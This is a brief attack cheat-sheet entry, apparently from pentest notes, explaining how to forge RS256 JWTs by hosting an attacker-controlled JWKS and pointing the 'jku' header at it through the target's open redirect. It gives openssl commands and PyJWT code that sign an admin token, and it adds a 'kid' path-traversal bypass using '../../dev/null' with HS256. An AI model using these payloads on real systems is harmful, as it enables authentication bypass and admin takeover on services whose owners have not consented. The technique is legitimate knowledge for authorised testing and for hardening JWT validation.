# JWT RS256 JWKS Spoofing via Open Redirect

If a JWT uses RS256 and the server fetches the JWKS URL from the `jku` header claim, and there is an open redirect on the target, host a malicious JWKS containing your own public key, then sign a JWT with your private key.

```bash
# 1. Generate RSA key pair
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -outform PEM -pubout -out attacker.pub
openssl rsa -in attacker.key -noout -text  # get modulus/exponent for JWKS

# 2. Build JWKS JSON at http://<LHOST>/jwks.json with your public key n/e values

# 3. Craft JWT with:
#    header: {"alg":"RS256","jku":"https://<TARGET>/redirect?url=http://<LHOST>/jwks.json"}
#    payload: {"sub":"admin","role":"admin","exp":...}
# Sign with attacker.key

# python-jwt / PyJWT:
import jwt, json
from cryptography.hazmat.primitives import serialization
key = open('attacker.key','rb').read()
token = jwt.encode({"sub":"admin"}, key, algorithm="RS256",
    headers={"jku":"https://<TARGET>/api/redirect?url=http://<LHOST>/jwks.json"})
```

Also check for `kid` header path traversal: `"kid":"../../dev/null"` with HS256 + empty key.
